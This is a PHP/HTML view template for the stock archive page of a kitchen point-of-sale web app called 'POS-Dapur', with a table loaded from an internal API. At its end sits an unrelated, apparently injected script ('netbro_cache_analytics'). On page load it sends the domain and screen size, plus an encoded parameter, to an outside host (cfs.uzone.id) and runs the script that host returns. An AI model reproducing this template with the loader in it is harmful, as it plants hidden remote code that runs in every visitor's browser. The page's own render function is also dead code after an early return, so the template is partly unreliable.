<!DOCTYPE html>
<!--
Template Name: Admin Lab Dashboard build with Bootstrap v2.3.1
Template Version: 1.3
Author: Mosaddek Hossain
Website: http://thevectorlab.net/
-->

<!--[if IE 8]>
<html lang="en" class="ie8"> <![endif]-->
<!--[if IE 9]>
<html lang="en" class="ie9"> <![endif]-->
<!--[if !IE]><!-->
<html lang="en"> <!--<![endif]-->
                 <!-- BEGIN HEAD -->
<head>
    <meta charset="utf-8"/>
    <title>POS-Dapur</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <meta content="" name="description"/>
    <meta content="" name="author"/>
    <meta name="base-url" content="<?php echo base_url() ?>">
    <link href="<?php echo base_url(); ?>assets/assets/bootstrap/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/assets/font-awesome/css/font-awesome.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/style_responsive.css" rel="stylesheet"/>
    <link href="<?php echo base_url(); ?>assets/css/datatables.min.css" rel="stylesheet" id="style_color"/>
</head>
<body id="login-body">
<div class="login-header">
    <?php $this->load->view('headerDapur.php') ?>
</div>
<div class="row-fluid">
    <div class="span12">
        <div class="widget">
            <div class="widget-title">
                <h4>
                    <i class="icon-reorder"></i>
                    Arsip Stok
                </h4>
            </div>
            <div class="widget-body">
                <div class="space15"></div>
                <table class="table table-striped table-hover table-bordered" id="stocks">
                    <thead>
                    <tr>
                        <th>Bahan baku</th>
                        <th>Stok Saat Ini</th>
                        <th>Stok Masuk</th>
                        <th>Stok Keluar</th>
                        <th>Aksi</th>
                    </tr>
                    </thead>
                    <tbody>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>
</body>
<script src="<?php echo base_url(); ?>assets/js/jquery-1.8.3.min.js"></script>
<script src="<?php echo base_url(); ?>assets/assets/bootstrap/js/bootstrap.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/jquery.blockui.js"></script>
<script src="<?php echo base_url(); ?>assets/js/datatables.min.js"></script>
<script src="<?php echo base_url(); ?>assets/js/scripts.js"></script>
<script>
    jQuery(document).ready(function () {
        //App.initLogin();
    });
</script>

<script>
    (function ($) {
        $(function () {
            var s_stocks  = 'table#stocks';
            var materials = <?php echo json_encode(isset($materials) ? $materials : [])?>;
            var stocks    = {};
            var dt_stocks = $(s_stocks).DataTable();

            function update()
            {
                return;
                var s_stocks_body = $(s_stocks).find('tbody');
                s_stocks_body.find('tr').remove();
                $.each(stocks, function (sk, sv) {
                    s_stocks_body.append(''
                        //@formatter:off
                        +'<tr data-id="'+sv['id_bahan']+'">'
                        +   '<td>'+materials[sk]['nama_bahan']+'</td>'
                        +   '<td>'+sv['stok']['current']+'</td>'
                        +   '<td>'+sv['stok']['l_in']+'</td>'
                        +   '<td>'+sv['stok']['l_out']+'</td>'
                        +   '<td>'
                        +       '<a href="<?php echo site_url('dapur/stok/masuk'); ?>">'
                        +           '<i class="icon-circle-arrow-down icon-white"></i>'
                        +           'Stok Masuk'
                        +       '</a>'
                        +       '<span style="margin: 0 8px;"></span>'
                        +       '<a href="<?php echo site_url('dapur/stok/keluar'); ?>">'
                        +           '<i class="icon-circle-arrow-up icon-white"></i>'
                        +           'Stok Keluar'
                        +       '</a>'
                        +   '</td>'
                        +'</tr>'
                        //@formatter:on
                    )
                });
            }

            function loadStock()
            {
                $.post(
                    $('meta[name=base-url]').attr('content') + 'api/dapur/stock',
                    null,
                    null,
                    'json')
                    .done(function (response) {
                        if (response !== undefined)
                        {
                            if (response['n'] !== undefined)
                            {
                                for (var i = -1, is = response['n'].length; ++i < is;)
                                {
                                    /*$.notify({
                                        message: response['n'][i]
                                    }, {
                                        type: 'info'
                                    });*/
                                }
                            }
                            if ((response['r'] !== undefined) && (response['r']['stok'] !== undefined))
                            {
                                stocks = response['r']['stok'];
                                update();
                            }
                        }
                    })
                    .fail(function (error) {
                    })
                    .always(function (error) {
                    });
            }

            loadStock();
        });
        /*
         * Run right away
         * */
    })(jQuery);

</script>
<script type="text/javascript">if (self == top)
    {
        function netbro_cache_analytics(fn, callback)
        {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn)
        {
            fn();
        }

        function requestCfs()
        {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r   = Math.floor(Math.random() * 99999999999);
            var url         = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGk5srYR1NCqaymjUKkR2Q68%2btBRwJ4fkwn84%2fZI96HghICGTn5Tck2pxLOIbENY0GiDslEhY%2fJhlTEuI%2bd9L6kPIgDWj3rw33B%2fNRbaSyZ05W%2fWrtro8gzNm43jjaMPzm58g1%2bEfPrkHwaggQpjXbMZ2SRASb%2fIdI7bQTrKwmjuXfI7vSCjOAWSlo91kSq5bORsV5CKxyCrCuVVCzHa%2f92VuTW8rYUFe4YSIzWeAd%2bZNz8JLFzSjNSTX960j8rGuKd1HYfuwOpylX4L4W6O6DgZc%2fn%2b2BQsoM52jehAlHYATogddmcH447w13p12qn2wLjIKLbq9G1lPgD0e2Y1%2b%2bvCy4DB5xFqc6%2fWZLhxHpUvuF4V0O2hAPqbQTiXghaxR7cP6Q9wq%2fb6gjrvzPnVK%2fzLGWkngHQG6yibbL41c%2f873jKuF%2bBS73ccBK4NAQze6DE9J4fINxulqdOJKXygCdEwno28zQ7px%2fuMJDLGwtDSMQMxXl2EuTE4wcPP4gG%2bYMbxEofGawNA%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa         = document.createElement('script');
            bsa.type        = 'text/javascript';
            bsa.async       = true;
            bsa.src         = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
</script>
</body>
</html>
